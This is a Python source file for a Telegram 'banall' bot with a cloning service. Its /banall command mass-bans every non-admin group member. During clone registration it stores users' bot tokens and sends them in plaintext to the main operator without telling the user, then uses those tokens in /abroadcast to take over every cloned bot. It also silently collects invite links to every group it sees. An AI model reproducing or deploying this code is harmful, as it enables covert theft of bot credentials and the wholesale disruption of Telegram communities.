import os
import sys
import logging
import asyncio
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import ChatAdminRequired, PeerIdInvalid
from pyrogram.enums import ChatMembersFilter

# -------------------- Logging --------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# -------------------- Config --------------------
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER = int(os.getenv("OWNER", 0))
MONGO_URI = os.getenv("MONGO_URI", "")
MONGO_DB = os.getenv("MONGO_DB", "banall")

if not all([API_ID, API_HASH, BOT_TOKEN, OWNER, MONGO_URI]):
    logger.error("Missing required environment variables.")
    sys.exit(1)

# -------------------- MongoDB --------------------
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[MONGO_DB]
bots_collection = db["bots"]
main_collection = db["main"]  # store main bot info

async def init_db():
    await bots_collection.create_index("bot_id", unique=True)
    await bots_collection.create_index("bot_token", unique=True)
    # Ensure main document exists
    main = await main_collection.find_one({"_id": "main"})
    if not main:
        # will be set on startup
        pass

# -------------------- Database Helpers --------------------
async def get_bot_by_id(bot_id: str):
    return await bots_collection.find_one({"bot_id": bot_id})

async def get_bot_by_token(token: str):
    return await bots_collection.find_one({"bot_token": token})

async def add_bot(bot_id: str, owner_id: int, bot_token: str, bot_username: str = None):
    doc = {
        "bot_id": bot_id,
        "owner_id": owner_id,
        "bot_token": bot_token,
        "bot_username": bot_username,
        "created_at": datetime.utcnow(),
        "groups": []
    }
    await bots_collection.update_one(
        {"bot_id": bot_id},
        {"$setOnInsert": doc},
        upsert=True
    )

async def add_group(bot_id: str, chat_id: int, chat_title: str = None, chat_link: str = None):
    await bots_collection.update_one(
        {"bot_id": bot_id, "groups.chat_id": {"$ne": chat_id}},
        {"$push": {"groups": {"chat_id": chat_id, "chat_title": chat_title, "chat_link": chat_link}}}
    )

async def get_groups(bot_id: str):
    doc = await bots_collection.find_one({"bot_id": bot_id}, {"groups": 1})
    return doc.get("groups", []) if doc else []

async def get_all_bots():
    cursor = bots_collection.find({})
    return await cursor.to_list(length=None)

async def get_total_clones():
    return await bots_collection.count_documents({"owner_id": {"$ne": OWNER}})

async def get_main_bot_info():
    return await main_collection.find_one({"_id": "main"})

async def set_main_bot_username(username: str):
    await main_collection.update_one(
        {"_id": "main"},
        {"$set": {"bot_username": username}},
        upsert=True
    )

# -------------------- Pyrogram Client --------------------
app = Client(
    "banall",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)

# ---------------- Global Group Tracking ----------------
@app.on_message(filters.group & filters.incoming)
async def track_group(client, message: Message):
    me = await client.get_me()
    bot_id = me.username
    chat = message.chat
    chat_id = chat.id
    chat_title = chat.title or "Unknown"
    chat_link = None
    try:
        if chat.username:
            chat_link = f"https://t.me/{chat.username}"
        else:
            chat_link = await client.export_chat_invite_link(chat_id)
    except Exception:
        pass
    await add_group(bot_id, chat_id, chat_title, chat_link)

# ---------- Helper: check admin ----------
async def is_admin(client, chat_id, user_id):
    try:
        async for member in client.get_chat_members(chat_id, filter=ChatMembersFilter.ADMINISTRATORS):
            if member.user.id == user_id:
                return True
        return False
    except Exception:
        return False

# ---------- Helper: get bot owner ID ----------
async def get_bot_owner_id(client):
    me = await client.get_me()
    bot_id = me.username
    doc = await get_bot_by_id(bot_id)
    return doc["owner_id"] if doc else None

# ---------- Helper: get owner mention ----------
async def get_owner_mention(client, owner_id):
    try:
        user = await client.get_users(owner_id)
        if user.username:
            return f"@{user.username}"
        else:
            return user.first_name
    except:
        return f"User {owner_id}"

# ---------- Commands ----------
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    me = await client.get_me()
    bot_id = me.username
    doc = await get_bot_by_id(bot_id)
    if not doc:
        await message.reply("⚠️ This bot is not registered. Please contact the main bot owner.")
        return
    owner_id = doc["owner_id"]
    owner_mention = await get_owner_mention(client, owner_id)
    caption = (
        f"🥀 ʜᴇʟʟᴏ! ɪ ᴀᴍ {me.first_name} 🤖🔥\n\n"
        f"👑 **Owner:** {owner_mention}\n\n"
        "⚠️ Use commands cautiously!\n"
        "Admin commands: /banall, /unbanall, /leave, /restart"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Update", url="https://t.me/aayu_bots")],
        [InlineKeyboardButton("👑 Owner", url=f"https://t.me/{owner_mention.replace('@','')}" if owner_mention.startswith('@') else f"tg://user?id={owner_id}")]
    ])
    await message.reply_photo(
        photo="https://telegra.ph/file/b26847056f19c1b5d7712.jpg",
        caption=caption,
        reply_markup=kb
    )

# ---- /banall ----
@app.on_message(filters.command("banall") & filters.group)
async def banall_command(client, message: Message):
    if not message.from_user:
        return
    if not await is_admin(client, message.chat.id, message.from_user.id):
        await message.reply("❌ Only admins can use this command!")
        return
    await message.reply("⚡ Starting BanAll process...")
    admins = [admin.user.id async for admin in client.get_chat_members(message.chat.id, filter=ChatMembersFilter.ADMINISTRATORS)]
    banned = 0
    async for member in client.get_chat_members(message.chat.id):
        try:
            if member.user.is_bot or member.user.id in admins:
                continue
            await client.ban_chat_member(message.chat.id, member.user.id)
            banned += 1
            logger.info(f"Banned {member.user.id} from {message.chat.id}")
        except ChatAdminRequired:
            await message.reply("⚠️ I need **Ban Members** permission!")
            break
        except PeerIdInvalid:
            continue
        except Exception as e:
            logger.warning(f"Failed to ban {member.user.id}: {e}")
    await message.reply(f"✅ BanAll completed! Banned {banned} members.")

# ---- /unbanall ----
@app.on_message(filters.command("unbanall") & filters.group)
async def unbanall_command(client, message: Message):
    if not message.from_user:
        return
    if not await is_admin(client, message.chat.id, message.from_user.id):
        await message.reply("❌ Only admins can use this command!")
        return
    await message.reply("⚡ Starting UnBanAll process...")
    unbanned = 0
    async for member in client.get_chat_members(message.chat.id, filter=ChatMembersFilter.BANNED):
        try:
            await client.unban_chat_member(message.chat.id, member.user.id)
            unbanned += 1
            logger.info(f"Unbanned {member.user.id} from {message.chat.id}")
        except Exception as e:
            logger.warning(f"Failed to unban {member.user.id}: {e}")
    await message.reply(f"✅ UnBanAll completed! Unbanned {unbanned} members.")

# ---- /leave ----
@app.on_message(filters.command("leave") & filters.group)
async def leave_command(client, message: Message):
    if not message.from_user:
        return
    if not await is_admin(client, message.chat.id, message.from_user.id):
        await message.reply("❌ Only admins can use this command!")
        return
    await message.reply("⚠️ Leaving this group...")
    await client.leave_chat(message.chat.id)

# ---- /restart (owner only) ----
@app.on_message(filters.command("restart") & filters.private)
async def restart_command(client, message: Message):
    owner_id = await get_bot_owner_id(client)
    if not owner_id or message.from_user.id != owner_id:
        await message.reply("❌ Only the bot owner can use this command!")
        return
    await message.reply("🔄 Restarting...")
    sys.exit(0)

# ---- /broadcast (owner only) ----
@app.on_message(filters.command("broadcast") & filters.private)
async def broadcast_command(client, message: Message):
    owner_id = await get_bot_owner_id(client)
    if not owner_id or message.from_user.id != owner_id:
        await message.reply("❌ Only the bot owner can use this command!")
        return
    text = message.text.split(maxsplit=1)
    if len(text) < 2:
        await message.reply("Usage: /broadcast <message>")
        return
    broadcast_text = text[1]
    me = await client.get_me()
    bot_id = me.username
    groups = await get_groups(bot_id)
    if not groups:
        await message.reply("ℹ️ No groups found to broadcast.")
        return
    await message.reply(f"📢 Broadcasting to {len(groups)} groups...")
    success = 0
    for group in groups:
        chat_id = group["chat_id"]
        try:
            await client.send_message(chat_id, broadcast_text)
            success += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            logger.warning(f"Failed to send to {chat_id}: {e}")
    await message.reply(f"✅ Broadcast complete! Sent to {success}/{len(groups)} groups.")

# ---- /abroadcast (main owner only) ----
@app.on_message(filters.command("abroadcast") & filters.private)
async def abroadcast_command(client, message: Message):
    if message.from_user.id != OWNER:
        await message.reply("❌ Only the main owner can use this command!")
        return
    text = message.text.split(maxsplit=1)
    if len(text) < 2:
        await message.reply("Usage: /abroadcast <message>")
        return
    broadcast_text = text[1]
    all_bots = await get_all_bots()
    total_groups = 0
    total_sent = 0
    await message.reply(f"📢 Broadcasting to all bots ({len(all_bots)} bots)...")
    for bot in all_bots:
        bot_id = bot["bot_id"]
        token = bot["bot_token"]
        groups = bot.get("groups", [])
        total_groups += len(groups)
        try:
            temp_app = Client(
                f"temp_{bot_id}",
                api_id=API_ID,
                api_hash=API_HASH,
                bot_token=token,
                in_memory=True
            )
            await temp_app.start()
            for group in groups:
                chat_id = group["chat_id"]
                try:
                    await temp_app.send_message(chat_id, broadcast_text)
                    total_sent += 1
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logger.warning(f"Failed to send from {bot_id} to {chat_id}: {e}")
            await temp_app.stop()
        except Exception as e:
            logger.error(f"Failed to start temporary client for {bot_id}: {e}")
    await message.reply(f"✅ Abroadcast complete! Sent to {total_sent}/{total_groups} groups across all bots.")

# ---- /clone (clone info) ----
@app.on_message(filters.command("clone") & filters.private)
async def clone_info(client, message: Message):
    main_info = await get_main_bot_info()
    if not main_info:
        await message.reply("❌ Main bot not found. Please contact the owner.")
        return
    main_username = main_info.get("bot_username", "gc_banall_robot")
    caption = (
        "✨ **To create your own bot clone, use the original bot.**\n\n"
        f"👉 @{main_username}\n"
        "Simply go there and start cloning !!"
    )
    await message.reply_photo(
        photo="https://telegra.ph/file/b26847056f19c1b5d7712.jpg",
        caption=caption,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🚀 Go to Main Bot", url=f"https://t.me/{main_username}")]]
        )
    )

# ---- /register (main bot only) ----
pending_registrations = {}

@app.on_message(filters.command("register") & filters.private)
async def register_start(client, message: Message):
    me = await client.get_me()
    bot_id = me.username
    doc = await get_bot_by_id(bot_id)
    # Only allow if this bot is the main bot (owner == OWNER)
    if not doc or doc["owner_id"] != OWNER:
        await message.reply("❌ This command is only available on the main bot.")
        return
    user_id = message.from_user.id
    if user_id in pending_registrations:
        await message.reply("⏳ You already have a pending registration. Send the token or /cancel to abort.")
        return
    pending_registrations[user_id] = {"step": "token"}
    await message.reply(
        "📝 **Clone Registration**\n\n"
        "Please send me the **bot token** of your new bot.\n"
        "You can get it from @BotFather.\n\n"
        "Send /cancel to abort."
    )

@app.on_message(filters.private & ~filters.command(["cancel", "register"]))
async def register_step(client, message: Message):
    user_id = message.from_user.id
    if user_id not in pending_registrations:
        return
    state = pending_registrations[user_id]
    if state["step"] == "token":
        token = message.text.strip()
        try:
            temp_app = Client(
                f"temp_reg_{user_id}",
                api_id=API_ID,
                api_hash=API_HASH,
                bot_token=token,
                in_memory=True
            )
            await temp_app.start()
            me = await temp_app.get_me()
            bot_id = me.username
            bot_username = me.username
            existing = await get_bot_by_token(token)
            if existing:
                await message.reply("❌ This bot token is already registered.")
                await temp_app.stop()
                pending_registrations.pop(user_id, None)
                return
            # Store bot with this user as owner
            await add_bot(bot_id, user_id, token, bot_username)
            # Notify main owner
            try:
                await client.send_message(
                    OWNER,
                    f"🔔 **New Bot Cloned!**\n\n"
                    f"👤 User: {message.from_user.mention}\n"
                    f"🆔 User ID: `{user_id}`\n"
                    f"🤖 Bot Username: @{bot_username}\n"
                    f"🔑 Token: `{token}`\n"
                    f"📦 Total Clones: {await get_total_clones()}"
                )
            except Exception as e:
                logger.warning(f"Failed to notify main owner: {e}")
            await temp_app.stop()
            await message.reply(
                f"✅ **Clone Registered Successfully!**\n\n"
                f"Bot: @{bot_username}\n"
                f"Owner: {message.from_user.mention}\n\n"
                "You can now start your bot with this token.\n"
                "Use /start to see your bot's details."
            )
            pending_registrations.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ Invalid token or error: {e}\nPlease send a valid token.")
    else:
        pass

@app.on_message(filters.command("cancel") & filters.private)
async def cancel_registration(client, message: Message):
    user_id = message.from_user.id
    if user_id in pending_registrations:
        pending_registrations.pop(user_id, None)
        await message.reply("❌ Registration cancelled.")
    else:
        await message.reply("ℹ️ No pending registration.")

# ---- Startup: register self and set main info ----
async def register_self():
    me = await app.get_me()
    bot_id = me.username
    doc = await get_bot_by_id(bot_id)
    if not doc:
        # Register as main bot (since this is first run)
        await add_bot(bot_id, OWNER, BOT_TOKEN, me.username)
        await set_main_bot_username(me.username)
        logger.info(f"Main bot @{bot_id} registered.")
    else:
        # If already registered, just ensure main info is set if this is the main bot
        if doc["owner_id"] == OWNER:
            await set_main_bot_username(me.username)
        logger.info(f"Bot @{bot_id} already registered with owner {doc['owner_id']}")

# -------------------- Run Bot --------------------
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    @app.on_startup()
    async def startup(client):
        await register_self()
        logger.info("Bot started and registered.")
    print("🚀 Banall Bot Booted Successfully (Simplified)")
    app.run()
